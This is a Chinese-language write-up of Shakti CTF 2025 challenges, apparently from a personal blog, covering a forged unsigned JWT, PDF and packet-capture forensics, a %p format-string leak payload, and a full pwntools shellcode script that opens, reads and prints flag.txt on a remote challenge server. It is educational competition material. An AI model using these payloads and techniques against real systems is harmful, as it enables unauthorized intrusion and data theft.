---
title: Shakti CTF 2025
published: 2025-07-26
updated: 2025-08-05
description: "Shakti CTF 2025 writeup"
image: "/assets/ShaktiCTF2025/cover.png"
tags: ["CTF Writeup"]
category: "CTF Writeup"
draft: true
---

跟 eating 一起打，這次計分沒有分開計

131 th / 554

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726231045.png)

總覺得越來越不會寫 osint 了，半題沒寫出來 (╥﹏╥)

---

# Shakti CTF 2025

## web

### Hooman

從題目給的 source code 來看，沒有驗證 JWT 簽章，所以可以用線上工具生成一個 `are_you_hooman` 欄位是 true 的 JWT token 就可以拿到 flag

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726030552.png)

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726030750.png)

隨便在首頁輸入一個名字，然後把 cookie 裡面的 JWT token 換成剛剛生成 `are_you_hooman` 為 true 的 token 就拿到 flag 了

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726030455.png)

```txt
shaktictf{now_uk_jwts_hoomannnnn}
```

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726030509.png)

## forensics

### Binary Reflection

拿到的 pdf 看起來像被倒過來(第一行變成最後一行、第二行變倒數第二行...，依此類推)

![](/assets/ShaktiCTF2025/Pasted%20image%2020250725205953.png)

先把 pdf 內容倒過來

```bash
tac corrupt.pdf > fixed.pdf
```

然後再用線上工具去看 pdf 裡面有沒有藏東西，就拿到 flag 了

![](/assets/ShaktiCTF2025/Pasted%20image%2020250725210554.png)

```txt
shaktictf{pdf_pr3tty_d4m4g3d_f0rm4t}
```

![](/assets/ShaktiCTF2025/Pasted%20image%2020250725210526.png)

### Glitch In Frame

封包裡面有文字以及一張 gif

![](/assets/ShaktiCTF2025/Pasted%20image%2020250725210952.png)

不知道要怎麼正確的把 gif 拿出來，直接把內容複製出來

![](/assets/ShaktiCTF2025/Pasted%20image%2020250725213504.png)

貼到 cyberchef ，output 是一張 gif，可以看出來是在播放的 flag

![](/assets/ShaktiCTF2025/Pasted%20image%2020250725213515.png)

用線上工具把 gif 放慢，就能得到 flag

![](/assets/ShaktiCTF2025/Pasted%20image%2020250725213801.png)

```txt
shaktictf{v1sU4l_d@t4_xf3ltr4t10n_thru_pkt5_and_fr4m3s_is_n0t_a_myth_just_v3ry_und3rr4ted}
```

![](/assets/ShaktiCTF2025/Pasted%20image%2020250725214542.png)

## PWN

### Secret Mission

這題的第一個反應是用 `%p` 去看 stack 上有甚麼

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726013334.png)

```txt
AAAAAAAAAAAAAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
```

在本地測試一下發現只要用很多 `%p` 就可以在 print 出來的東西裡面發現 flag，所以 nc 過去輸入一樣的 payload

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726013259.png)

整個貼到 cyberchef 上面就能拿到很像 flag 的東西

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726013316.png)

把這段字串貼到 Multi Decoder，再稍微排序一下就得到 flag 了

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726013020.png)

```txt
shaktictf{th3_eXtr@ct3d_@bilitie5_v@n1sh_but_th3_fl@g_r3m@1ns}
```

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726013235.png)

### Seashells

用 ghidra 看程式碼，首先會讀取最大 0x500 (1280 bytes) 的輸入到 local_518，然後使用 mmap() 建立一塊 可讀、可寫、可執行的記憶體區段（RWX），並將輸入複製到該區段，再把這段記憶體區段當作函式來呼叫，(\*\_\_dest)(); 直接跳入 shellcode 執行

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726023602.png)

`seccomp_initialisation()` 裡面有允許的 syscall，例如`open`、`read`、`write` 等少數幾個

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726023641.png)

讓 chatgpt 生 script 然後再調整檔名

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

shellcode = asm('''
    xor rax, rax
    lea rdi, [rip + filename]
    xor rsi, rsi
    mov rax, 2          /* sys_open */
    syscall

    mov rdi, rax        /* fd */
    lea rsi, [rip + buf]
    mov rdx, 100
    mov rax, 0          /* sys_read */
    syscall

    mov rdi, 1          /* stdout */
    lea rsi, [rip + buf]
    mov rdx, 100
    mov rax, 1          /* sys_write */
    syscall

    mov rax, 60         /* sys_exit */
    xor rdi, rdi
    syscall

filename:
    .asciz "flag.txt"
buf:
    .space 100
''')

def main():
    p = remote("43.205.113.100", 8855)

    prompt = p.recvuntil(b'>>')
    print(prompt.decode())

    p.send(shellcode.ljust(0x500, b'\x00'))

    flag = p.recvrepeat(timeout=3)
    print("[*] Flag output:\n", flag.decode())

    p.close()

if __name__ == "__main__":
    main()
```

成功拿到 flag

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726023516.png)

```txt
shaktictf{u_g0t_wh@t_u_w15h3d__th3_s3@sh311_f1@g}
```

![](/assets/ShaktiCTF2025/Pasted%20image%2020250726023316.png)

---

分享一下很酷的東西，少了提示可能這輩子都找不到 welcome flag 了

不確定甚麼原理，但是在 discord 裡面，這一段符號後面的內容除了把整份文字複製下來才可以看到，並且送出訊息後不會通知

```txt
  ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _
```

應該是整到很多人，太好玩了，到比賽結束前還有人在文字頻道 /flag
